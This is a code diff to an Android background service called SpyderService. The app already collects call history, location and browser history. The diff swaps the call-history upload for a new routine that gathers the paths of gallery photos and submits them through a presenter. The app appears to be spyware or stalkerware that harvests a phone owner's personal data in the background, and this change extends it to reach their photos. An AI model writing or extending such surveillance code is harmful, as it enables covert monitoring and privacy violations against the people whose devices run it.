@@ -16,6 +16,7 @@ import com.spyder.app.activitys.request.CallHistoryDetailsPojo;
 import com.spyder.app.activitys.request.LocationDetail;
 import com.spyder.app.activitys.request.LocationDetails;
 import com.spyder.app.activitys.request.UserDetails;
+import com.spyder.app.activitys.request.UserPhotoDetailList;
 import com.spyder.app.activitys.response.BaseContext;
 import com.spyder.app.activitys.util.CommonUtil;
 import com.spyder.app.activitys.util.Constants;
@@ -63,7 +64,9 @@ public class SpyderService extends Service implements SpyderContract.View {
         //timerOperation();
 //call History and browserDetails
         getDetailsInformation = new GetDetailsInformation(getApplicationContext());
-        callSaveCallHistoryDetails();
+       // callSaveCallHistoryDetails();
+        MyLog.log("This time was I called Get Gallery Photos.....","start......");
+        getGalleryPhotosService();
         //getDetailsInformation.getBrowserHistory();
         //getDetailsInformation.secondmethodBrowserHistory();
 
@@ -130,6 +133,13 @@ public class SpyderService extends Service implements SpyderContract.View {
        // MyLog.log("calldetails", gson.toJson(callHistoryDetails));
         //showProgressDialog();
         mSpyderPresenter.savecallHistoryDetails(callHistoryDetails);
+    }
+    public void getGalleryPhotosService() {
+        UserPhotoDetailList userPhotoDetailList = new UserPhotoDetailList();
+        userPhotoDetailList.setPhotoDetails(getDetailsInformation.fn_imagespath());
+        // MyLog.log("calldetails", gson.toJson(callHistoryDetails));
+        //showProgressDialog();
+        mSpyderPresenter.savePhotoDetails(userPhotoDetailList);
     }
 
 
